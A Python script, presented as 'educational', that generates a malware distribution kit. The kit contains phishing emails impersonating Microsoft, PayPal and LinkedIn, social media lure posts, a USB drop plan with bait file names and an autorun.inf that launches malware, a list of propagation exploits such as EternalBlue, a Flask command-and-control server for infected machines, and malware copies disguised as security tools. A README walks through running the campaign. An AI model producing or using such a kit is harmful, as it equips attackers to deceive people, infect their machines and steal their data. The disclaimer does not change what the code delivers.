#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Simple Malware Distribution Strategy
WARNING: This is for educational purposes only!
"""

import os
import json
import shutil
import zipfile

class SimpleDistribution:
    def __init__(self):
        self.distribution_methods = []
        
    def create_distribution_kit(self):
        """Create complete distribution kit"""
        print("Creating distribution kit...")
        
        # Create distribution folder
        dist_folder = "malware_distribution_kit"
        os.makedirs(dist_folder, exist_ok=True)
        
        # 1. Email Campaigns
        self.create_email_templates(dist_folder)
        
        # 2. Social Media Campaigns
        self.create_social_media_templates(dist_folder)
        
        # 3. USB Drop Strategy
        self.create_usb_strategy(dist_folder)
        
        # 4. Network Propagation
        self.create_network_strategy(dist_folder)
        
        # 5. Command and Control
        self.create_c2_server(dist_folder)
        
        # 6. Obfuscated Payloads
        self.create_obfuscated_payloads(dist_folder)
        
        # Create README
        self.create_readme(dist_folder)
        
        # Create zip file
        shutil.make_archive("malware_distribution_kit", 'zip', dist_folder)
        
        print("Distribution kit created: malware_distribution_kit.zip")
    
    def create_email_templates(self, folder):
        """Create email phishing templates"""
        templates = [
            {
                "subject": "Urgent Security Update - Microsoft",
                "body": "Dear user, Microsoft has detected a critical vulnerability. Please run the attached file to apply security update.",
                "attachment": "security_update.exe"
            },
            {
                "subject": "Pending Invoice - PayPal",
                "body": "Your PayPal account has a pending payment. Please review the attached document.",
                "attachment": "invoice.pdf.exe"
            },
            {
                "subject": "Job Offer - LinkedIn",
                "body": "Congratulations! You have been selected for a remote position. Please complete the attached form.",
                "attachment": "job_application.exe"
            }
        ]
        
        for i, template in enumerate(templates):
            with open(os.path.join(folder, f"email_template_{i+1}.txt"), 'w') as f:
                f.write(f"Subject: {template['subject']}\n\n")
                f.write(template['body'])
                f.write(f"\n\nAttachment: {template['attachment']}")
    
    def create_social_media_templates(self, folder):
        """Create social media distribution templates"""
        posts = [
            "Download the new game everyone is playing! Link in bio #gaming",
            "WhatsApp update available - download now for new features",
            "Limited offer: Professional editing software FREE for limited time",
            "New Instagram filter - download the app to access",
            "Crypto trading bot that generates $1000/day - download free"
        ]
        
        with open(os.path.join(folder, "social_media_posts.txt"), 'w') as f:
            for post in posts:
                f.write(f"{post}\n\n")
    
    def create_usb_strategy(self, folder):
        """Create USB drop strategy"""
        strategy = {
            "locations": [
                "Company parking lots",
                "Universities and schools",
                "Cafes and restaurants",
                "Airports and stations",
                "Government offices"
            ],
            "file_names": [
                "CONFIDENTIAL_SALARIES.xlsx",
                "COMPANY_PASSWORDS.txt",
                "PRIVATE_PHOTOS.zip",
                "TAX_RETURN_2024.pdf",
                "BANK_STATEMENTS.xlsx"
            ],
            "autorun_script": """
[autorun]
open=malware.exe
icon=malware.exe
label=USB Drive
action=Open folder to view files
"""
        }
        
        with open(os.path.join(folder, "usb_strategy.json"), 'w') as f:
            json.dump(strategy, f, indent=2)
        
        with open(os.path.join(folder, "autorun.inf"), 'w') as f:
            f.write(strategy["autorun_script"])
    
    def create_network_strategy(self, folder):
        """Create network propagation strategy"""
        strategy = {
            "target_ports": [21, 22, 23, 80, 135, 139, 443, 445, 3389],
            "exploits": [
                "EternalBlue (MS17-010)",
                "BlueKeep (CVE-2019-0708)",
                "SMBGhost (CVE-2020-0796)"
            ],
            "propagation_methods": [
                "SMB exploitation",
                "RDP exploitation",
                "SSH brute force",
                "Web application exploits"
            ]
        }
        
        with open(os.path.join(folder, "network_strategy.json"), 'w') as f:
            json.dump(strategy, f, indent=2)
    
    def create_c2_server(self, folder):
        """Create command and control server"""
        c2_code = '''
from flask import Flask, request, jsonify
import json
import time

app = Flask(__name__)
infected_machines = {}

@app.route('/register', methods=['POST'])
def register_machine():
    data = request.json
    machine_id = data.get('machine_id')
    ip_address = request.remote_addr
    
    infected_machines[machine_id] = {
        'ip': ip_address,
        'last_seen': time.time(),
        'status': 'active'
    }
    
    return jsonify({'status': 'registered'})

@app.route('/command/<machine_id>', methods=['GET'])
def get_command(machine_id):
    if machine_id in infected_machines:
        return jsonify({'command': 'steal_data'})
    return jsonify({'command': 'none'})

@app.route('/data/<machine_id>', methods=['POST'])
def receive_data(machine_id):
    if machine_id in infected_machines:
        data = request.json
        return jsonify({'status': 'received'})
    return jsonify({'status': 'error'})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
'''
        
        with open(os.path.join(folder, "c2_server.py"), 'w') as f:
            f.write(c2_code)
    
    def create_obfuscated_payloads(self, folder):
        """Create obfuscated malware variants"""
        # Copy original malware with different names
        variants = [
            "security_update.py",
            "system_optimizer.py",
            "antivirus_scanner.py",
            "windows_fix.py",
            "driver_update.py"
        ]
        
        if os.path.exists("app.py"):
            for variant in variants:
                shutil.copy2("app.py", os.path.join(folder, variant))
    
    def create_readme(self, folder):
        """Create README file"""
        readme = """
# Malware Distribution Kit

## WARNING
This kit is for educational and security research purposes only.
DO NOT use for malicious activities.

## Kit Contents:

### 1. Main Malware
- app.py: Main malware with all functionalities

### 2. Email Campaigns
- email_template_*.txt: Phishing email templates

### 3. Social Media
- social_media_posts.txt: Social media distribution posts

### 4. Physical Distribution
- usb_strategy.json: USB drop strategy
- autorun.inf: USB autorun file

### 5. Network Propagation
- network_strategy.json: Network propagation strategy

### 6. Command and Control
- c2_server.py: Command and control server

### 7. Obfuscated Payloads
- security_update.py, system_optimizer.py, etc.

## Usage Instructions:

1. Set up C2 server
2. Customize email templates
3. Create obfuscated payloads
4. Execute distribution campaigns
5. Monitor infections

## Legal Considerations:
- Only use in controlled environments
- Obtain explicit permissions
- Comply with all local laws
- Use only for ethical research
        """
        
        with open(os.path.join(folder, "README.md"), 'w') as f:
            f.write(readme)

def main():
    """Main execution function"""
    print("=" * 50)
    print("MALWARE DISTRIBUTION STRATEGY CREATOR")
    print("=" * 50)
    
    distributor = SimpleDistribution()
    
    try:
        distributor.create_distribution_kit()
        
        print("\n" + "=" * 50)
        print("DISTRIBUTION STRATEGY COMPLETED")
        print("=" * 50)
        print("\nFiles created:")
        print("- Distribution kit: malware_distribution_kit.zip")
        print("- C2 server: c2_server.py")
        print("- Obfuscated payloads: security_update.py, etc.")
        print("- Distribution strategies: *.json")
        print("- Phishing templates: email_template_*.txt")
        
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()


